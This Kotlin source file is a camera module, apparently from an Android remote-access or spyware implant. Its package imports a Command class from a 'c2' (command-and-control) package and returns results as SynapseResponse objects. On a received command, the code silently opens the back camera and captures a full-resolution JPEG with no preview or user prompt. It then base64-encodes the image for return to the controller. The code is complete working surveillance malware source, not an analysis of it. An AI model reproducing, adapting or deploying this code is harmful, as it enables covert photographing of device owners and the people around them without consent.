package org.synapse.core.modules

import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.Image
import android.media.ImageReader
import android.util.Base64
import android.util.Log
import org.synapse.core.c2.Command
import org.synapse.core.core.SynapseResponse
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference
import kotlin.coroutines.resume
import kotlin.coroutines.resumeWithException
import kotlin.coroutines.suspendCoroutine

object CameraModule {

    private const val TAG = "Synapse.Camera"
    private const val CAPTURE_TIMEOUT_SEC = 10L

    suspend fun capture(context: Context, cmd: Command): SynapseResponse {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        val cameraId: String = try {
            cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            } ?: cameraManager.cameraIdList.firstOrNull()
            ?: return SynapseResponse.ErrorResponse("camera:no_camera", "camera")
        } catch (e: CameraAccessException) {
            return SynapseResponse.ErrorResponse("camera:${e.message}", "camera")
        }

        val characteristics = cameraManager.getCameraCharacteristics(cameraId)
        val size = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            ?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
        val width = size?.width ?: 1920
        val height = size?.height ?: 1080

        val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)

        val device: CameraDevice = try {
            suspendCoroutine { cont ->
                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(cam: CameraDevice) = cont.resume(cam)
                    override fun onDisconnected(cam: CameraDevice) { cam.close() }
                    override fun onError(cam: CameraDevice, err: Int) {
                        cam.close()
                        cont.resumeWithException(CameraAccessException(err, "open failed: $err"))
                    }
                }, null)
            }
        } catch (e: Exception) {
            imageReader.close()
            return SynapseResponse.ErrorResponse("camera:open:${e.message}", "camera")
        }

        try {
            val jpeg = AtomicReference<ByteArray>()
            val latch = CountDownLatch(1)

            imageReader.setOnImageAvailableListener({ reader ->
                val img = reader.acquireLatestImage()
                if (img != null) {
                    try {
                        val buf = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        jpeg.set(bytes)
                    } finally { img.close() }
                }
                latch.countDown()
            }, null)

            val sessionOpened = suspendCoroutine<CameraCaptureSession> { cont ->
                device.createCaptureSession(listOf(imageReader.surface),
                    object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(s: CameraCaptureSession) = cont.resume(s)
                        override fun onConfigureFailed(s: CameraCaptureSession) {
                            cont.resumeWithException(RuntimeException("configure failed"))
                        }
                    }, null)
            }

            val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
                set(CaptureRequest.JPEG_ORIENTATION, 0)
            }

            sessionOpened.capture(req.build(), object : CameraCaptureSession.CaptureCallback() {
                override fun onCaptureFailed(s: CameraCaptureSession, r: CaptureRequest, f: CaptureFailure) {
                    latch.countDown()
                }
            }, null)

            val ok = latch.await(CAPTURE_TIMEOUT_SEC, TimeUnit.SECONDS)
            sessionOpened.close()

            val bytes = jpeg.get()
            return if (bytes != null && bytes.isNotEmpty()) {
                SynapseResponse.CameraResponse(
                    image_base64 = Base64.encodeToString(bytes, Base64.NO_WRAP),
                    width = width, height = height, format = "JPEG", size_bytes = bytes.size.toLong()
                )
            } else {
                SynapseResponse.ErrorResponse("camera:empty_frame", "camera")
            }
        } catch (e: Exception) {
            return SynapseResponse.ErrorResponse("camera:${e.message}", "camera")
        } finally {
            device.close()
            imageReader.close()
        }
    }
}
